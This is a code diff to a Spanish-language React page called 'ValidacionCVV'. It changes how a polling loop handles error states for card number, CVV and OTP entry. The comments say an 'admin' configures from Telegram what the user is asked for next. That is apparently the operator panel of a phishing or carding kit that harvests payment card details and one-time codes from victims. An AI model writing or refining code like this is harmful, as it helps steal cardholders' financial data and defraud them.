@@ -81,13 +81,18 @@ export default function ValidacionCVV() {
                 }
 
                 // PRIMERO verificar estados de error (deben tener prioridad)
+                // Si estamos en CVV y se rechaza CVV Custom, mostrar error y NO redirigir
                 if (estado === 'error_cvv_custom') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
                     setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
-                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
+                    setTimeout(() => {
+                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
+                        // Después de mostrar el error, volver a solicitar CVV Custom
+                        // El admin puede volver a configurar desde Telegram
+                    }, 2000);
                     setCvv("");
                     return;
                 }
@@ -169,11 +174,13 @@ export default function ValidacionCVV() {
                         break;
                     case 'error_tc':
                     case 'error_tc_custom':
-                        localStorage.setItem('estado_sesion', 'error');
-                        navigate("/validacion-tc");
+                        // Si estamos en CVV y hay error de TC, NO redirigir a TC
+                        // Solo redirigir si realmente es necesario
+                        // Por ahora, no hacer nada ya que estamos en CVV
                         break;
                     case 'error_cvv_custom':
-                        // No redirigir, el modal de error ya se mostró arriba
+                        // No redirigir, el modal de error ya se mostró arriba y se detuvo el polling
+                        // El usuario permanece en la vista de CVV
                         break;
                     case 'error_otp':
                         localStorage.setItem('estado_sesion', 'error');
